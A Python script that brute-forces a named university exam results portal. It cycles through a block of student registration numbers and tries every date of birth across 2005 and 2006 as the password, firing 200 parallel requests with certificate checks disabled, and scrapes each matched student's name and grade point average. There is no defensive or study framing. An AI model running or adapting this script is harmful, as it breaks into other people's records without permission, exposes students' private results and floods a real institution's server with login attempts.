import requests
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://results.nie.ac.in/index.php"

for i in range(2, 3):
    for j in range(0, 10):
        for k in range(0, 10):
            usni = i
            usnj = j
            usnk = k
            usn = "4NI24CS"
            usn3 = str(usni) + str(usnj) + str(usnk)
            usn4 = usn + usn3
            max_threads = 200

            start_date = datetime.strptime("01-01-2005", "%d-%m-%Y")
            end_date = datetime.strptime("31-12-2006", "%d-%m-%Y")
            all_dobs = [(start_date + timedelta(days=i)).strftime("%d-%m-%Y") for i in range((end_date - start_date).days + 1)]

            def try_dob(dob_str):
                data = {
                    "usn": usn4,
                    "dob": dob_str,
                    "option": "com_examresult",
                    "task": "getResult"
                }
                try:
                    res = requests.post(url, data=data, verify=False, timeout=15)
                    if "not Matched" not in res.text:
                        soup = BeautifulSoup(res.text, "html.parser")

                        # Better selector for name using h3 tag inside any student-header class
                        name_tag = soup.select_one("div.student-header h3")
                        name = name_tag.text.strip() if name_tag else "Name Not Found"

                        # Better selector for SGPA using caption span (which is unique enough)
                        sgpa_tag = soup.select_one("table caption span")
                        sgpa = sgpa_tag.text.strip() if sgpa_tag else "SGPA Not Found"

                        return f"{usn4} : {dob_str} : {name} : {sgpa}"
                except Exception as e:
                    return f"⚠ Error on {dob_str}: {e}"
                return None

            found = None
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                future_to_dob = {executor.submit(try_dob, dob): dob for dob in all_dobs}
                for future in as_completed(future_to_dob):
                    result = future.result()
                    if result:
                        print(result)
                        found = True
                        break

            if not found:
                print(f"{usn4} : Na")
